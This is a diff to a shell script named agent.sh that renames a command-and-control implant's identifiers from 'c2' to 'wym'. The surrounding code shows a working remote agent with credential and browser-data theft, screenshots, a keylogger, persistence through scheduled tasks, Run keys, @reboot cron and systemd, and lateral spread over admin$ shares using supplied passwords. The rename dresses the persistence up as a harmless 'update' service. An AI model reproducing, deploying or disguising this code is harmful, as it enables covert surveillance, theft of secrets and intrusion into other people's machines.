@@ -11,15 +11,15 @@
 #              --interval 5 --jitter 2 --verbose
 #
 # Environment variables (accepted when the flag is not given):
-#   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
-#   (plus C2_DBG for debug output)
+#   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
+#   (plus WYM_DBG for debug output)
 #
 # Flags:
-#   --server URL      server base URL (required unless C2_SERVER is set)
-#   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+#   --server URL      server base URL (required unless WYM_SERVER is set)
+#   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 #   --interval N      heartbeat interval in seconds (default 10, min 1)
 #   --jitter N        random jitter in seconds added to the interval
-#   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+#   --state FILE      state file persisting the agent id (default ~/.wymagent.json)
 #   --verbose         print activity to stdout
 #   -h, --help        show this help and exit
 #
@@ -27,13 +27,13 @@
 
 set -u
 
-SERVER="${C2_SERVER:-}"
-TOKEN="${C2_TOKEN:-}"
-INTERVAL="${C2_INTERVAL:-10}"
-JITTER="${C2_JITTER:-0}"
-VERBOSE="${C2_VERBOSE:-0}"
-STATE_FILE="${HOME}/.c2agent.json"
-C2_STATE_FILE="${C2_STATE_FILE:-}"
+SERVER="${WYM_SERVER:-}"
+TOKEN="${WYM_TOKEN:-}"
+INTERVAL="${WYM_INTERVAL:-10}"
+JITTER="${WYM_JITTER:-0}"
+VERBOSE="${WYM_VERBOSE:-0}"
+STATE_FILE="${HOME}/.wymagent.json"
+WYM_STATE_FILE="${WYM_STATE_FILE:-}"
 
 # ---------------------------------------------------------------- helpers
 
@@ -41,7 +41,7 @@ log() {
   if [ "$VERBOSE" = "1" ]; then echo "[*] $*"; fi
 }
 
-DBG="${C2_DBG:-0}"
+DBG="${WYM_DBG:-0}"
 dbg() {
   [ "$DBG" = "1" ] && echo "[dbg] $*" >&2
 }
@@ -285,7 +285,7 @@ upload() {
 # Cross-agent resurrection watchdog. Monitors a target agent via the
 # server; if the target is dead/stale, runs a relaunch command.
 
-CLONE_DIR() { echo "${TMPDIR:-/tmp}/.c2clone_${AGENT_ID:-unknown}"; }
+CLONE_DIR() { echo "${TMPDIR:-/tmp}/.wymclone_${AGENT_ID:-unknown}"; }
 
 clone_action() {
   # $1 = action (start|stop|status), $2 = args json
@@ -525,8 +525,8 @@ steal_task() {
   profile=$(echo "$args" | json_get '.profile // "all"')
   case "$profile" in all|env|tokens|browser) ;; *) profile=all ;; esac
   local work
-  work=$(mktemp -d "${TMPDIR:-/tmp}/c2steal.XXXXXX" 2>/dev/null || echo "/tmp/c2steal_$$")
-  [ -d "$work" ] || work=$(mktemp -d 2>/dev/null || { mkdir -p "/tmp/c2steal_$$" && echo "/tmp/c2steal_$$"; })
+  work=$(mktemp -d "${TMPDIR:-/tmp}/wymsteal.XXXXXX" 2>/dev/null || echo "/tmp/wymsteal_$$")
+  [ -d "$work" ] || work=$(mktemp -d 2>/dev/null || { mkdir -p "/tmp/wymsteal_$$" && echo "/tmp/wymsteal_$$"; })
   local manifest=""
   if [ "$profile" = "all" ] || [ "$profile" = "env" ]; then
     local m
@@ -582,9 +582,9 @@ screenshot() {
   # $1 = task_id, $2 = label (optional)
   local tid="$1" label="${2:-screenshot}" tmp
   if command -v mktemp >/dev/null 2>&1; then
-    tmp=$(mktemp "${TMPDIR:-/tmp}/c2shot.XXXXXX.png")
+    tmp=$(mktemp "${TMPDIR:-/tmp}/wymshot.XXXXXX.png")
   else
-    tmp="/tmp/c2shot_$$.png"
+    tmp="/tmp/wymshot_$$.png"
   fi
   local ok=0
   if command -v screencapture >/dev/null 2>&1; then
@@ -616,7 +616,7 @@ screenshot() {
 # (PowerShell GetAsyncKeyState on Windows, xinput->awk on Linux) that appends
 # to a log file; 'dump' stops the collector and returns the captured text.
 
-klog_base() { echo "${TMPDIR:-/tmp}/.c2keylog_${AGENT_ID}"; }
+klog_base() { echo "${TMPDIR:-/tmp}/.wymkeylog_${AGENT_ID}"; }
 
 proc_alive() {
   [ -n "${1:-}" ] || return 1
@@ -663,7 +663,7 @@ while (1) {
 PS
   cat > "$base.sh" <<'SH'
 #!/bin/sh
-C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
+C2P=${C2P:-/tmp/.wymnope}; C2K=${C2K:-/tmp/.wymnope}
 echo $$ > "$C2P"
 kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
 [ -z "$kid" ] && exit 1
@@ -745,48 +745,48 @@ persistence_task() {
   PERSIST_RC=0
   case "$osname" in
     *mingw*|*msys*|*cygwin*|*nt-*)
-      destdir="${APPDATA:-${HOME:-.}}/Microsoft/Windows/c2update"
-      dest="$destdir/c2agent.sh"
+      destdir="${APPDATA:-${HOME:-.}}/Microsoft/Windows/wymupdate"
+      dest="$destdir/wymagent.sh"
       mkdir -p "$destdir" 2>/dev/null
       cp -f "$0" "$dest" 2>/dev/null
       cmd="$interp \"$dest\" --server \"$srv\" --token \"$tok\" --interval \"$iv\" --jitter \"$jt\""
       progdata="${ProgramData:-${ALLUSERSPROFILE:-C:\ProgramData}}"
-      wrapper="$progdata/c2update/c2relaunch.cmd"
-      mkdir -p "$progdata/c2update" 2>/dev/null
+      wrapper="$progdata/wymupdate/wymrelaunch.cmd"
+      mkdir -p "$progdata/wymupdate" 2>/dev/null
       cat > "$wrapper" <<EOF
 @echo off
 start "" /b $cmd
 EOF
       sed -i 's/$/\r/' "$wrapper" 2>/dev/null
       out="persistence: copied self to $dest"$'\n'"persistence: wrote launcher $wrapper"
-      if schtasks /Create /TN "c2agent-persist" /TR "$wrapper" /SC ONLOGON /RL HIGHEST /F >/dev/null 2>&1; then
-        out="$out"$'\n'"schtasks: scheduled ONLOGON (c2agent-persist)"
-      elif reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v c2agent /t REG_SZ /d "$wrapper" /f >/dev/null 2>&1; then
-        out="$out"$'\n'"reg: HKCU Run key set (c2agent)"
+      if schtasks /Create /TN "wymagent-persist" /TR "$wrapper" /SC ONLOGON /RL HIGHEST /F >/dev/null 2>&1; then
+        out="$out"$'\n'"schtasks: scheduled ONLOGON (wymagent-persist)"
+      elif reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v wymagent /t REG_SZ /d "$wrapper" /f >/dev/null 2>&1; then
+        out="$out"$'\n'"reg: HKCU Run key set (wymagent)"
       else
         PERSIST_RC=1
         out="$out"$'\n'"persistence: failed — schtasks and reg add both failed"
       fi
       ;;
     *)
-      destdir="${HOME:-.}/.config/c2update"
+      destdir="${HOME:-.}/.config/wymupdate"
       dest="$destdir/$(basename "$0")"
       mkdir -p "$destdir" 2>/dev/null
       cp -f "$0" "$dest" 2>/dev/null
       cmd="$interp \"$dest\" --server \"$srv\" --token \"$tok\" --interval \"$iv\" --jitter \"$jt\""
-      cronout=$( (crontab -l 2>/dev/null | grep -v 'c2agent-persist'; printf '@reboot %s # c2agent-persist\n' "$cmd") | crontab - 2>&1 )
+      cronout=$( (crontab -l 2>/dev/null | grep -v 'wymagent-persist'; printf '@reboot %s # wymagent-persist\n' "$cmd") | crontab - 2>&1 )
       [ -z "$cronout" ] && cr_ok=1
-      unit="$destdir/c2-update.service"
-      printf '[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c "%s"\nRestart=always\n\n[Install]\nWantedBy=default.target\n' "$cmd" > "$unit" 2>/dev/null
+      unit="$destdir/wym-update.service"
+      printf '[Unit]\nDescription=wym update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c "%s"\nRestart=always\n\n[Install]\nWantedBy=default.target\n' "$cmd" > "$unit" 2>/dev/null
       sctl=""
       if command -v systemctl >/dev/null 2>&1; then
-        sctl=$(systemctl --user daemon-reload 2>&1; systemctl --user enable --now c2-update.service 2>&1)
+        sctl=$(systemctl --user daemon-reload 2>&1; systemctl --user enable --now wym-update.service 2>&1)
         local sctlrc=$?
         [ "$sctlrc" = "0" ] && sys_ok=1
       else
         sctl="systemctl: unavailable"
       fi
-      replies="${cronout:-crontab: @reboot hook installed (c2agent-persist)}"
+      replies="${cronout:-crontab: @reboot hook installed (wymagent-persist)}"
       [ -n "$sctl" ] && replies="$replies"$'\n'"$sctl"
       if [ "$cr_ok" = "1" ] || [ "$sys_ok" = "1" ]; then
         out="persistence: copied self to $dest"$'\n'"$replies"
@@ -830,10 +830,10 @@ lateral_win_deploy() {
     net use "\\\\$host\\admin\$" /delete /y >/dev/null 2>&1
     return 1
   fi
-  terr=$(schtasks /Create /S "$host" /TN "c2agent-lateral" /TR "\\\\$host\\admin\$\\$base" /SC ONLOGON /RU "$user" /RP "$pass" /RL HIGHEST /F 2>&1); trc=$?
+  terr=$(schtasks /Create /S "$host" /TN "wymagent-lateral" /TR "\\\\$host\\admin\$\\$base" /SC ONLOGON /RU "$user" /RP "$pass" /RL HIGHEST /F 2>&1); trc=$?
   net use "\\\\$host\\admin\$" /delete /y >/dev/null 2>&1
   if [ "$trc" -eq 0 ]; then
-    echo "deployed (file dropped + scheduled c2agent-lateral)"
+    echo "deployed (file dropped + scheduled wymagent-lateral)"
   else
     echo "deployed (file dropped; task: $terr)"
   fi
@@ -873,8 +873,8 @@ lateral_task() {
   subnet=$(echo "$args" | json_get '.subnet // ""')
   user=$(echo "$args" | json_get '.user // ""')
   pass=$(echo "$args" | json_get '.pass // ""')
-  [ -n "$user" ] || user="${C2_LAT_USER:-}"
-  [ -n "$pass" ] || pass="${C2_LAT_PASS:-}"
+  [ -n "$user" ] || user="${WYM_LAT_USER:-}"
+  [ -n "$pass" ] || pass="${WYM_LAT_PASS:-}"
   own=$(local_ip)
   base=""
   if [ -n "$subnet" ]; then
@@ -898,7 +898,7 @@ lateral_task() {
     n=$((n + 1))
     if [ -z "$plist" ]; then plist="$host"; else plist="$plist, $host"; fi
     if [ -z "$user" ] && [ -z "$pass" ]; then
-      status="skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
+      status="skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)"
       skip=$((skip + 1))
     else
       case "$osname" in
@@ -1028,17 +1028,17 @@ while [ $# -gt 0 ]; do
     --token) TOKEN="$2"; shift 2 ;;
     --interval) INTERVAL="$2"; shift 2 ;;
     --jitter) JITTER="$2"; shift 2 ;;
-    --state) STATE_FILE="$2"; C2_STATE_OVERRIDE=1; shift 2 ;;
+    --state) STATE_FILE="$2"; WYM_STATE_OVERRIDE=1; shift 2 ;;
     --verbose) VERBOSE=1; shift ;;
     -h|--help|help)
       echo "usage: agent.sh --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
       echo
-      echo "Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):"
-      echo "  --server URL      server base URL (required unless C2_SERVER is set)"
-      echo "  --token TOKEN     shared agent token (required unless C2_TOKEN is set)"
+      echo "Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):"
+      echo "  --server URL      server base URL (required unless WYM_SERVER is set)"
+      echo "  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)"
       echo "  --interval N      heartbeat interval in seconds (default 10, min 1)"
       echo "  --jitter N        random jitter in seconds added to the interval"
-      echo "  --state FILE      state file persisting the agent id (default ~/.c2agent.json)"
+      echo "  --state FILE      state file persisting the agent id (default ~/.wymagent.json)"
       echo "  --verbose         print activity to stdout"
       echo "  -h, --help        show this help and exit"
       exit 0
@@ -1048,7 +1048,7 @@ while [ $# -gt 0 ]; do
 done
 
 [ -n "$SERVER" ] && [ -n "$TOKEN" ] || die "usage: agent.sh --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
-[ -z "${C2_STATE_OVERRIDE:-}" ] && [ -n "$C2_STATE_FILE" ] && STATE_FILE="$C2_STATE_FILE"
+[ -z "${WYM_STATE_OVERRIDE:-}" ] && [ -n "$WYM_STATE_FILE" ] && STATE_FILE="$WYM_STATE_FILE"
 
 SERVER="${SERVER%/}"
 load_id
